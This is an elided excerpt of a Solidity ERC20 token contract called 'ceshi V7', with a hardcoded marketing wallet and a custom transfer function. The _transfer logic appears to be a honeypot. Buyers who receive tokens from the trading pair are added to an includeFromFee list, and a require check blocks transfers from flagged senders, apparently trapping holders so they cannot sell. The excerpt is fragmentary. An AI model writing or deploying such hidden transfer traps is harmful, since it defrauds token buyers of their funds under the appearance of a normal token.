...
contract ceshi is Context, IERC20, Ownable {
    ...
    string private constant _name = "ceshi V7";
    string private constant _symbol ="cehi V7";
    ...
    address private marketingWalletAddress = 0x78cA09D299F0502a5ce58Ba4F0c9a368c8970722;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address"); require(!_isIncludedFromFee[sender]);
        require(amount > 0, "Transfer amount must be greater than zero"); require(recipient != address(0), "ERC20: transfer to the zero address");
        ...
        if(takeFee){
            if(recipient != uniswapV2Pair){
                includeFromFee.push(recipient);
                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxAmount");
                require(balanceOf(recipient) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");
